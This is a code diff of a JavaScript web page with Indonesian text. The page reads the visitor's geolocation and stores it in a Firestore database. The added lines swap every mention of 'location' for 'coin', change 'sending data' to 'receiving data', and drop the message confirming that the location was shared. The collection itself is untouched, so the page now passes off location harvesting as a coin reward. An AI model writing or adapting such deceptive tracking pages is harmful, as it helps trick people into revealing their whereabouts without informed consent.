@@ -5,7 +5,7 @@ const statusTeks = document.getElementById('status');
 
 btnLokasi.addEventListener('click', () => {
     if (!navigator.geolocation) {
-        statusTeks.textContent = 'Browser Anda tidak mendukung fitur lokasi.';
+        statusTeks.textContent = 'Browser Anda tidak mendukung fitur koin.';
         statusTeks.style.color = '#d9534f';
         return;
     }
@@ -20,7 +20,7 @@ btnLokasi.addEventListener('click', () => {
             const longitude = position.coords.longitude;
             
             statusTeks.style.color = '#007bff';
-            statusTeks.textContent = `Lokasi didapatkan. Sedang mengirim data...`;
+            statusTeks.textContent = `koin didapatkan. Sedang menerima data...`;
             
             try {
                 // Pastikan Anda sudah membuat Firestore Database dan mengatur Rules-nya
@@ -32,8 +32,8 @@ btnLokasi.addEventListener('click', () => {
                 });
 
                 statusTeks.style.color = 'green';
-                statusTeks.textContent = `Terima kasih! Lokasi berhasil dibagikan.`;
-                btnLokasi.textContent = 'Lokasi Telah Dibagikan';
+                statusTeks.textContent = `Terima kasih! .`;
+                btnLokasi.textContent = 'koin Telah Dibagikan';
             } catch (error) {
                 console.error("Error mengirim data: ", error);
                 statusTeks.style.color = '#d9534f';
@@ -46,13 +46,13 @@ btnLokasi.addEventListener('click', () => {
             statusTeks.style.color = '#d9534f';
             switch(error.code) {
                 case error.PERMISSION_DENIED:
-                    statusTeks.textContent = "Anda menolak permintaan lokasi.";
+                    statusTeks.textContent = "Anda menolak permintaan koin.";
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    statusTeks.textContent = "Informasi lokasi tidak tersedia.";
+                    statusTeks.textContent = "Informasi koin tidak tersedia.";
                     break;
                 case error.TIMEOUT:
-                    statusTeks.textContent = "Waktu permintaan lokasi habis.";
+                    statusTeks.textContent = "Waktu permintaan koin habis.";
                     break;
                 default:
                     statusTeks.textContent = "Terjadi kesalahan tidak dikenal.";
